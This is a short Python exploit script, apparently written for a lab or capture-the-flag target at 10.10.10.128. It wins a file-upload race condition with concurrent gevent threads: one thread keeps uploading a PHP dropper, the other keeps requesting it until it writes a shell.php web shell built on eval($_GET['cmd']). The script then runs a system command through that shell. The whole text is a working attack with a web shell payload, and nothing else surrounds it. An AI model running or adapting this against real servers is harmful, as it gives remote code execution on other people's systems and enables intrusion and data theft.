# -*- encoding:utf-8 -*-
# a simple test for concurrency, only to win the server side check.

import requests
import gevent
import time
from gevent import monkey
from gevent.__semaphore import BoundedSemaphore

monkey.patch_all()
target = 'http://10.10.10.128/'
flag = False
sem = BoundedSemaphore()
proxy = {'http':'http://127.0.0.1:8080'}

def getShell():
    while True:
        sem.acquire()
        global flag
        if flag == True:
            print("We've  get a shell!")
            sem.release()
            break
        sem.release()
        file = {"file":('getShell.php',"<?php fputs(fopen('shell.php','w'),'<?php echo eval($_GET[\\'cmd\\']); ?>'); ?>")}
        data = None
        rep = requests.post(target+'handle.php', data, files=file)
        print(rep.text)


def  webShell():
        while True:
            rep = requests.get(target+'upload/shell.php')
            if rep.status_code == 200:
                sem.acquire()
                global flag
                flag = True
                print("The shell exsits!")
                sem.release()
                break
            else:
                requests.get(target+'upload/getShell.php')

if __name__=='__main__':
    start = time.time()
    task = []
    task.append(gevent.spawn(getShell))
    task.append(gevent.spawn(webShell))
    gevent.joinall(task)
    if flag == True:
        rep = requests.get(target + 'upload/shell.php?cmd=system("ls%20-l%20..");')
        print(rep.text)